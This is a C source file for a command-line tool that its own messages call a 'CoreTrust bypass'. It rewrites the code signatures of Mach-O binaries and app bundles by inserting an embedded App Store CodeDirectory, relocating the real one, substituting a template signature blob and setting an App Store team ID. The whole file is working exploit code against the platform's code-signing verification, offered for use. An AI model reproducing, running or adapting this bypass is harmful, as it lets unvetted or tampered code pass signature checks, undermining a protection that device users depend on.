
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <choma/CSBlob.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/Signing.h>
#include <choma/SignatureBlob.h>
#include <choma/SignOSSL.h>
#include <choma/CodeDirectory.h>
#include "AppStoreCodeDirectory.h"
#include "TemplateSignatureBlob.h"
#include <copyfile.h>

#define APPSTORE_CERT_TEAM_ID "T8ALTGMVXN"

char *extract_preferred_slice(const char *fatPath)
{
    FAT *fat = fat_init_from_path(fatPath);
    if (!fat) return NULL;
    MachO *macho = fat_find_preferred_slice(fat);
    if (!macho) return NULL;
    
    char *temp = strdup("/tmp/XXXXXX");
    int fd = mkstemp(temp);

    MemoryStream *outStream = file_stream_init_from_path(temp, 0, 0, FILE_STREAM_FLAG_WRITABLE | FILE_STREAM_FLAG_AUTO_EXPAND);
    MemoryStream *machoStream = macho_get_stream(macho);
    memory_stream_copy_data(machoStream, 0, outStream, 0, memory_stream_get_size(machoStream));

    fat_free(fat);
    memory_stream_free(outStream);
    close(fd);
    return temp;
}

int extract_blobs(CS_SuperBlob *superBlob, const char *dir)
{
    CS_DecodedSuperBlob *decodedSuperblob = superblob_decode(superBlob);

    CS_DecodedBlob *blob = decodedSuperblob->firstBlob;
    while (blob) {
        char outPath[PATH_MAX];
        uint32_t magic = 0;
        //uint32_t len = 0;
        memory_stream_read(blob->stream, offsetof(CS_GenericBlob, magic), sizeof(magic), &magic);
        //memory_stream_read(blob->stream, offsetof(CS_GenericBlob, length), sizeof(len), &len);
        magic = BIG_TO_HOST(magic);
        //len = BIG_TO_HOST(len);

        snprintf(outPath, PATH_MAX, "%s/%x_%x.bin", dir, blob->type, magic);

        uint64_t len = memory_stream_get_size(blob->stream);
        uint8_t blobData[len];
        memory_stream_read(blob->stream, 0, len, blobData);

        FILE *f = fopen(outPath, "wb");
        fwrite(blobData, len, 1, f);
        fclose(f);

        blob = blob->next;
    }
    return 0;
}

char *get_argument_value(int argc, char *argv[], const char *flag)
{
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i], flag)) {
            if (i+1 < argc) {
                return argv[i+1];
            }
        }
    }
    return NULL;
}

bool argument_exists(int argc, char *argv[], const char *flag)
{
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i], flag)) {
            return true;
        }
    }
    return false;
}

void print_usage(const char *self)
{
    printf("Usage: %s -i <path to input MachO/FAT file or .app bundle> (-r) (-o <path to output MachO file>)\n", self);
    exit(-1);
}

int apply_coretrust_bypass(const char *machoPath)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }

    bool isDynamicLibrary = macho->machHeader.filetype == MH_DYLIB;
    if (!isDynamicLibrary && macho->machHeader.filetype != MH_EXECUTE) {
        printf("Error: only executables and dynamic libraries are supported.\n");
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = superblob_decode(superblob);

    // Replace the first CodeDirectory with the one from the App Store
    CS_DecodedBlob *blob = decodedSuperblob->firstBlob;
    if (blob->type != CSSLOT_CODEDIRECTORY) {
        printf("The first blob is not a CodeDirectory!\n");
        return -1;
    }

    bool hasTwoCodeDirectories = superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES) != NULL;
    if (!hasTwoCodeDirectories) {
        // We need to insert the App Store CodeDirectory in the first slot and move the original one to the last slot
        CS_DecodedBlob *firstCD = superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY);
        if (firstCD == NULL) {
            printf("Failed to find CodeDirectory slot!");
            return -1;
        }
        CS_DecodedBlob *currentBlob = decodedSuperblob->firstBlob;
        while (currentBlob->next) {
            currentBlob = currentBlob->next;
        }
        currentBlob->next = malloc(sizeof(CS_DecodedBlob));
        currentBlob->next->stream = firstCD->stream;
        currentBlob->next->type = CSSLOT_ALTERNATE_CODEDIRECTORIES;
        currentBlob->next->next = NULL;

    } else {
        // Don't free if we've moved the original CodeDirectory to the last slot
        memory_stream_free(blob->stream);
    }

    printf("Adding App Store CodeDirectory...\n");
    MemoryStream *appstoreCDStream = buffered_stream_init_from_buffer(AppStoreCodeDirectory, AppStoreCodeDirectory_len, 0);
    blob->stream = appstoreCDStream;
    CS_DecodedBlob *requirementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_REQUIREMENTS);
    if (requirementsBlob == NULL) {
        printf("Failed to find Requirements slot!");
        return -1;
    }
    CS_DecodedBlob *entitlementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS);
    if (entitlementsBlob == NULL && !isDynamicLibrary) {
        printf("Error: No entitlements found!\n");
        return -1;
    }
    // DER entitlements aren't required on iOS 14
    CS_DecodedBlob *derEntitlementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS);
    CS_DecodedBlob *actualCDBlob = superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    if (actualCDBlob == NULL) {
        printf("Failed to find Alternate Code Directories slot!");
        return -1;
    }
    CS_DecodedBlob *signatureBlob = superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT);
    if (requirementsBlob == NULL) {
        printf("Failed to find Code Signature slot!");
        return -1;
    }

    // After Modification:
    // 1. App Store CodeDirectory
    // 2. Requirements
    // 3. Entitlements
    // 4. DER entitlements
    // 5. Actual CodeDirectory
    // 6. Signature blob

    printf("Adding new signature blob...\n");
    if (signatureBlob != NULL) {
        memory_stream_free(signatureBlob->stream);
        signatureBlob->stream = buffered_stream_init_from_buffer(TemplateSignatureBlob, TemplateSignatureBlob_len, 0);
    } else {
        signatureBlob = malloc(sizeof(CS_DecodedBlob));
        signatureBlob->type = CSSLOT_SIGNATURESLOT;
        signatureBlob->stream = buffered_stream_init_from_buffer(TemplateSignatureBlob, TemplateSignatureBlob_len, 0);
        signatureBlob->next = NULL;
        CS_DecodedBlob *nextBlob = decodedSuperblob->firstBlob;
        while (nextBlob->next) {
            nextBlob = nextBlob->next;
        }
        nextBlob->next = signatureBlob;
    }

    const char *teamIDToSet = APPSTORE_CERT_TEAM_ID;
    size_t teamIDToSetSize = strlen(teamIDToSet)+1;

    if (actualCDBlob != NULL) {
        CS_CodeDirectory codeDir;
        memory_stream_read(actualCDBlob->stream, 0, sizeof(codeDir), &codeDir);
        CODE_DIRECTORY_APPLY_BYTE_ORDER(&codeDir, BIG_TO_HOST_APPLIER);

        int32_t shift = 0;
        uint32_t initalTeamOffset = codeDir.teamOffset;

        // If there is already a TeamID, delete it
        if (initalTeamOffset != 0) {
            uint32_t existingTeamIDSize = 0;
            char *existingTeamID = NULL;
            memory_stream_read_string(actualCDBlob->stream, initalTeamOffset, &existingTeamID);
            existingTeamIDSize = strlen(existingTeamID)+1;
            free(existingTeamID);

            memory_stream_delete(actualCDBlob->stream, initalTeamOffset, existingTeamIDSize);
            shift -= existingTeamIDSize;
        }

        // Insert new TeamID
        if (codeDir.identOffset == 0) {
            printf("No identity found, that's bad.\n");
            return -1;
        }
        char *ident = NULL;
        memory_stream_read_string(actualCDBlob->stream, codeDir.identOffset, &ident);
        uint32_t newTeamOffset = codeDir.identOffset + strlen(ident) + 1;
        free(ident);
        memory_stream_insert(actualCDBlob->stream, newTeamOffset, teamIDToSetSize, teamIDToSet);
        shift += teamIDToSetSize;
        
        codeDir.teamOffset = newTeamOffset;

        // Offsets that point to after the TeamID have to be shifted
        if (codeDir.hashOffset != 0 && codeDir.hashOffset > initalTeamOffset) {
            codeDir.hashOffset += shift;
        }
        if (codeDir.scatterOffset != 0 && codeDir.scatterOffset > initalTeamOffset) {
            codeDir.scatterOffset += shift;
        }

        CODE_DIRECTORY_APPLY_BYTE_ORDER(&codeDir, HOST_TO_BIG_APPLIER);
        memory_stream_write(actualCDBlob->stream, 0, sizeof(codeDir), &codeDir);
    }
    else {
        printf("Failed to locate actual CD blob.\n");
        return -1;
    }

    printf("Creating new superblob...\n");
    requirementsBlob->next = entitlementsBlob;
    if (isDynamicLibrary) {
        requirementsBlob->next = actualCDBlob;
    } else {
        if (derEntitlementsBlob) {
        entitlementsBlob->next = derEntitlementsBlob;
        derEntitlementsBlob->next = actualCDBlob;
        } else {
            entitlementsBlob->next = actualCDBlob;
        }
    }
    actualCDBlob->next = signatureBlob;
    signatureBlob->next = NULL;

    uint64_t sizeOfCodeSignature = BIG_TO_HOST(superblob->length);
    CS_SuperBlob *encodedSuperblobUnsigned = superblob_encode(decodedSuperblob);
    printf("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, sizeOfCodeSignature, memory_stream_get_size(macho->stream)) != 0) {
        printf("Error: failed to update load commands!\n");
        return -1;
    }
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    CS_DecodedBlob *codeDirectoryBlob = superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    update_code_directory(macho, codeDirectoryBlob->stream);
    superblob_fixup_lengths(decodedSuperblob);

    int ret = 0;
    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding superblob...\n");
    CS_SuperBlob *newSuperblob = superblob_encode(decodedSuperblob);

    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    decoded_superblob_free(decodedSuperblob);
    free(superblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}

int apply_coretrust_bypass_wrapper(const char *inputPath, const char *outputPath)
{
    char *machoPath = extract_preferred_slice(inputPath);
    printf("extracted best slice to %s\n", machoPath);

    int r = apply_coretrust_bypass(machoPath);
    if (r != 0) {
        free(machoPath);
        return r;
    }

    r = copyfile(machoPath, outputPath, 0, COPYFILE_ALL | COPYFILE_MOVE | COPYFILE_UNLINK);
    if (r == 0) {
        chmod(outputPath, 0755);
        printf("Signed file! CoreTrust bypass eta now!!\n");
    }
    else {
        perror("copyfile");
    }

    free(machoPath);
    return r;
}

int apply_coretrust_bypass_to_app_bundle(const char *appBundlePath) {
    // Recursively find all MachO files in the app bundle
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;

    if ((dir = opendir(appBundlePath)) == NULL) {
        perror("opendir");
        return -1;
    }

    while ((entry = readdir(dir)) != NULL) {
        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", appBundlePath, entry->d_name);

        if (stat(fullpath, &statbuf) == -1) {
            perror("stat");
            return -1;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                // Recursive call for subdirectories
                apply_coretrust_bypass_to_app_bundle(fullpath);
            }
        } else {
            // Process file
            MemoryStream *stream = file_stream_init_from_path(fullpath, 0, 0, 0);
            if (!stream) {
                printf("Error: failed to open file %s\n", fullpath);
                continue;
            }
            uint32_t magic = 0;
            memory_stream_read(stream, 0, sizeof(magic), &magic);
            if (magic == FAT_MAGIC_64 || magic == MH_MAGIC_64) {
                printf("Applying bypass to %s.\n", fullpath);
                apply_coretrust_bypass_wrapper(fullpath, fullpath);
            }
            memory_stream_free(stream);
        }
    }

    closedir(dir);
    return 0;
}

int main(int argc, char *argv[]) {
    printf("CoreTrust bypass eta s0n!!\n");

    if (argc < 2) {
        print_usage(argv[0]);
    }

    char *input = get_argument_value(argc, argv, "-i");
    char *output = get_argument_value(argc, argv, "-o");
    bool replace = argument_exists(argc, argv, "-r");
    if (!output && !replace) {
        print_usage(argv[0]);
    }
    if (!output && replace) {
        output = input;
    }

    struct stat s;
    bool inputExists = stat(input, &s) == 0;
    bool outputExists = stat(output, &s) == 0;

    if (!inputExists) {
        print_usage(argv[0]);
    }

    if (outputExists && !replace) {
        printf("Error: Output file already exists, for overwriting use the -r argument\n");
        return -1;
    }

    // If the input ends with .app, assume it's an app bundle
    if (strlen(input) > 4 && !strcmp(input + strlen(input) - 4, ".app")) {
        printf("Applying CoreTrust bypass to app bundle.\n");
        return apply_coretrust_bypass_to_app_bundle(input);
    }
    return apply_coretrust_bypass_wrapper(input, output);
}
